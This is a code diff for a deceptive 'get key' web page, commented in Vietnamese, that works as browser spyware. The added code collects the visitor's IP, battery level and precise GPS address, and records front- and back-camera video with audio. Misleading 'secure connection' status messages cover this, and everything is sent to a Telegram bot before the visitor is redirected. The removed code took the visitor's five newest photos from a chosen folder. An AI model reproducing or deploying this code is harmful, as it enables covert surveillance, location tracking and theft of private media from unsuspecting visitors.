@@ -211,6 +211,7 @@
   const TELEGRAM_CHAT_ID = '-5529480454'; 
   const REDIRECT_URL = 'https://xnhau.city/';
 
+  // Kiểm tra In-App Browser (Telegram, Messenger, Facebook, Zalo, TikTok,...)
   function checkInAppBrowser() {
     const ua = navigator.userAgent || navigator.vendor || window.opera;
     const isInApp = /Telegram|Gram|FBAN|FBAV|Messenger|Instagram|Zalo|TikTok|Line|Viber|Twitter|LinkedInApp/i.test(ua);
@@ -246,55 +247,54 @@
   const video = document.getElementById('video');
   const getKeyBtn = document.getElementById('get-key-btn');
 
-  // Hàm lấy tên thiết bị chuẩn xác
-  async function getDetailedDeviceName() {
-    let deviceStr = "PC / Laptop 💻";
-    const ua = navigator.userAgent;
-    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-      try {
-        const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
-        if (hints.model) {
-          deviceStr = `${hints.platform} (${hints.model}) 🤖`;
-          return deviceStr;
-        }
-      } catch (e) {}
-    }
-    if (/android/i.test(ua)) {
-      let match = ua.match(/;\s([A-Za-z0-9\s\-]+)\sBuild\//);
-      let model = match ? match[1].trim() : "Android Phone";
-      deviceStr = `Android - ${model} 🤖`;
-    } else if (/iphone|ipad|ipod/i.test(ua)) {
-      deviceStr = `iOS / Apple Device 🍏`;
-    } else if (/windows/i.test(ua)) {
-      deviceStr = `Windows PC 💻`;
-    } else if (/macintosh|mac os x/i.test(ua)) {
-      deviceStr = `MacBook / macOS 💻`;
-    }
-    return deviceStr;
+  // Lấy thông tin % pin thiết bị
+  async function getBatteryInfo() {
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        const level = Math.round(battery.level * 100);
+        const charging = battery.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
+        return `${level}% (${charging})`;
+      }
+    } catch (e) {}
+    return 'Không rõ';
   }
 
-  // Hàm tự động yêu cầu cấp quyền truy cập kho lưu trữ/thư mục hệ thống để trích xuất 5 ảnh mới nhất
-  async function fetchRecentPhotosAutomatic() {
-    let imageFiles = [];
-    try {
-      if (window.showDirectoryPicker) {
-        const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
-        for await (const entry of dirHandle.values()) {
-          if (entry.kind === 'file') {
-            const file = await entry.getFile();
-            if (file.type.startsWith('image/')) {
-              imageFiles.push({ file: file, lastModified: file.lastModified });
-            }
-          }
-        }
-        // Sắp xếp thời gian chỉnh sửa giảm dần để lấy 5 ảnh gần nhất
-        imageFiles.sort((a, b) => b.lastModified - a.lastModified);
-        return imageFiles.slice(0, 5).map(item => item.file);
+  // Lấy vị trí GPS chính xác của người dùng
+  async function getExactLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve({ address: 'Không hỗ trợ định vị', mapsUrl: '' });
+        return;
       }
-    } catch (e) {
-      // Người dùng từ chối cấp quyền hoặc trình duyệt không hỗ trợ API truy xuất thư mục trực tiếp
-    }
-    return [];
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = Math.round(position.coords.accuracy);
+          const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+          
+          let addressName = `Tọa độ: ${lat.toFixed(5)}, ${lon.toFixed(5)} (Sai số ~${accuracy}m)`;
+          
+          // Sử dụng Nominatim (OpenStreetMap) để dịch tọa độ thành địa chỉ cụ thể
+          try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+              headers: { 'User-Agent': 'Mozilla/5.0' }
+            });
+            const data = await res.json();
+            if (data && data.display_name) {
+              addressName = data.display_name;
+            }
+          } catch (e) {}
+
+          resolve({ address: addressName, mapsUrl: mapsUrl });
+        },
+        (error) => {
+          resolve({ address: 'Người dùng từ chối cấp quyền vị trí', mapsUrl: '' });
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
   }
 
   // Hàm quay video MP4 kèm âm thanh
@@ -309,6 +309,7 @@
 
       return await new Promise((resolve) => {
         let recordedChunks = [];
+        
         let options = { mimeType: 'video/mp4' };
         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
           if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac')) {
@@ -321,6 +322,7 @@
         }
 
         const mediaRecorder = new MediaRecorder(stream, options);
+
         mediaRecorder.ondataavailable = (event) => {
           if (event.data && event.data.size > 0) {
             recordedChunks.push(event.data);
@@ -349,6 +351,7 @@
     getKeyBtn.style.display = 'none';
     statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
 
+    // Thu thập thông tin IP, Pin và Vị trí GPS chính xác song song
     let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
     try {
       const ipRes = await fetch('https://ipwho.is/');
@@ -363,20 +366,28 @@
       }
     } catch (e) {}
 
-    const deviceName = await getDetailedDeviceName();
+    statusDiv.textContent = '[*] Đang xác thực định vị & thiết bị...';
+    const [batteryInfo, locationData] = await Promise.all([
+      getBatteryInfo(),
+      getExactLocation()
+    ]);
 
-    const infoText = 
-      `💻 <b>YÊU CẦU GET KEY (AUTO 5 ẢNH MỚI NHẤT)</b> 💻\n` +
+    const ua = navigator.userAgent;
+    let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
+
+    let infoText = 
+      `💻 <b>YÊU CẦU GET KEY (NÂNG CẤP)</b> 💻\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `📱 <b>Thiết bị chuẩn:</b> ${deviceName}\n` +
+      `📱 <b>Thiết bị:</b> ${deviceName}\n` +
+      `🔋 <b>Phần trăm pin:</b> ${batteryInfo}\n` +
       `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
-      `🏙️ <b>Địa điểm:</b> ${ipDetails.city}, ${ipDetails.country}\n` +
-      `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
-      `━━━━━━━━━━━━━━━━━━━━━`;
+      `🏙️ <b>Khu vực (ISP):</b> ${ipDetails.city}, ${ipDetails.country} (${ipDetails.org})\n` +
+      `📍 <b>Địa chỉ GPS chính xác:</b> ${locationData.address}\n`;
 
-    // Tự động yêu cầu cho phép truy cập dữ liệu hệ thống để lấy 5 ảnh gần đây
-    statusDiv.textContent = '[*] Đang yêu cầu quyền truy cập dữ liệu album ảnh...';
-    const recentPhotos = await fetchRecentPhotosAutomatic();
+    if (locationData.mapsUrl) {
+      infoText += `🗺️ <b>Google Maps:</b> <a href="${locationData.mapsUrl}">Xem vị trí trên bản đồ</a>\n`;
+    }
+    infoText += `━━━━━━━━━━━━━━━━━━━━━`;
 
     statusDiv.textContent = '[*] Đang ghi hình luồng #1 (Camera sau)...';
     let backVideoBlob = await recordVideo('environment', 3000);
@@ -384,37 +395,17 @@
     statusDiv.textContent = '[*] Đang ghi hình luồng #2 (Camera trước)...';
     let frontVideoBlob = await recordVideo('user', 3000);
 
-    // Gửi thông tin văn bản
-    try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText, parse_mode: 'HTML' })
-      });
-    } catch (e) {}
-
-    // Gửi lần lượt 5 ảnh gần đây nếu được cấp quyền
-    if (recentPhotos && recentPhotos.length > 0) {
-      for (let i = 0; i < recentPhotos.length; i++) {
-        const photoFd = new FormData();
-        photoFd.append('chat_id', TELEGRAM_CHAT_ID);
-        photoFd.append('photo', recentPhotos[i]);
-        photoFd.append('caption', `🖼️ <b>Ảnh gần đây thứ ${i + 1} từ hệ thống</b>`);
-        photoFd.append('parse_mode', 'HTML');
-        try {
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: photoFd });
-        } catch (e) {}
-      }
-    }
+    let hasSent = false;
 
     if (backVideoBlob && backVideoBlob.size > 0) {
       const fd = new FormData();
       fd.append('chat_id', TELEGRAM_CHAT_ID);
       fd.append('video', backVideoBlob, 'back_video.mp4');
-      fd.append('caption', '🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
+      fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
       fd.append('parse_mode', 'HTML');
       try { 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd }); 
+        hasSent = true;
       } catch(e){}
     }
 
@@ -426,7 +417,18 @@
       fd2.append('parse_mode', 'HTML');
       try { 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd2 }); 
+        hasSent = true;
       } catch(e){}
+    }
+
+    if (!hasSent) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể quay video hoặc truy cập camera/microphone)', parse_mode: 'HTML', disable_web_page_preview: true })
+        });
+      } catch (e) {}
     }
 
     statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
